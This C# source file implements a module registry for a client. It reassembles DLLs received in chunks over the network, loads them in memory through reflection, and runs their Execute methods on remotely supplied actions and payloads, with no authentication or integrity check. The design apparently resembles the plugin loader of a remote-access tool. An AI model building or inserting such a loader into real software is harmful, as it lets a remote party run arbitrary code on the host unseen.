using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;

namespace mullvad.Client.Modules
{
    // Reassembles chunked module DLLs and loads them via reflection.
    internal static class ModuleRegistry
    {
        private static readonly Dictionary<string, byte[][]>  _chunks   = new Dictionary<string, byte[][]>(StringComparer.OrdinalIgnoreCase);
        private static readonly Dictionary<string, LoadedModule> _modules = new Dictionary<string, LoadedModule>(StringComparer.OrdinalIgnoreCase);

        // Call with each ModuleLoad packet.  Returns the module_id when final chunk received.
        internal static string? AddChunk(string moduleId, int chunkIndex, int totalChunks, byte[] data)
        {
            lock (_chunks)
            {
                if (!_chunks.TryGetValue(moduleId, out var arr))
                {
                    arr = new byte[totalChunks][];
                    _chunks[moduleId] = arr;
                }
                arr[chunkIndex] = data;

                // Check if all chunks received
                foreach (var c in arr)
                    if (c == null) return null;

                return moduleId;
            }
        }

        // Call when AddChunk returns the module_id (all chunks received).
        // Returns error message on failure, null on success.
        internal static string? Load(string moduleId)
        {
            byte[][] chunks;
            lock (_chunks)
            {
                if (!_chunks.TryGetValue(moduleId, out chunks))
                    return "No chunks found for module " + moduleId;
                _chunks.Remove(moduleId);
            }

            // Reassemble DLL bytes
            int total = 0;
            foreach (var c in chunks) total += c.Length;
            var dll = new byte[total];
            int off = 0;
            foreach (var c in chunks) { Array.Copy(c, 0, dll, off, c.Length); off += c.Length; }

            try
            {
                var asm = Assembly.Load(dll);

                // Find a class with a public instance method: string Execute(string, string)
                // and a public static property/field: string ModuleId
                foreach (var type in asm.GetTypes())
                {
                    if (type.IsAbstract || !type.IsClass) continue;

                    var execMethod = type.GetMethod("Execute",
                        BindingFlags.Public | BindingFlags.Instance,
                        null,
                        new[] { typeof(string), typeof(string) },
                        null);
                    if (execMethod == null) continue;

                    var idProp  = type.GetProperty("ModuleId", BindingFlags.Public | BindingFlags.Static);
                    var idField = type.GetField("ModuleId",    BindingFlags.Public | BindingFlags.Static);

                    string? mid = idProp?.GetValue(null) as string ?? idField?.GetValue(null) as string;
                    if (string.IsNullOrEmpty(mid)) mid = moduleId;

                    var instance = Activator.CreateInstance(type);
                    lock (_modules)
                        _modules[mid] = new LoadedModule(instance, execMethod, mid);

                    return null; // success
                }
                return "No module entry class found in DLL for " + moduleId;
            }
            catch (Exception ex)
            {
                return "Failed to load module: " + ex.Message;
            }
        }

        // Execute a module action.  Returns JSON result string.
        internal static string? Execute(string moduleId, string action, string payload)
        {
            LoadedModule? mod;
            lock (_modules)
                if (!_modules.TryGetValue(moduleId, out mod)) return null;

            try
            {
                return mod.ExecuteMethod.Invoke(mod.Instance, new object[] { action, payload }) as string ?? "";
            }
            catch (TargetInvocationException tie)
            {
                return "{\"error\":\"" + Escape(tie.InnerException?.Message ?? tie.Message) + "\"}";
            }
            catch (Exception ex)
            {
                return "{\"error\":\"" + Escape(ex.Message) + "\"}";
            }
        }

        private static string Escape(string s)
            => s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ");

        private sealed class LoadedModule
        {
            public readonly object       Instance;
            public readonly MethodInfo   ExecuteMethod;
            public readonly string       Id;
            public LoadedModule(object instance, MethodInfo exec, string id)
            {
                Instance      = instance;
                ExecuteMethod = exec;
                Id            = id;
            }
        }
    }
}
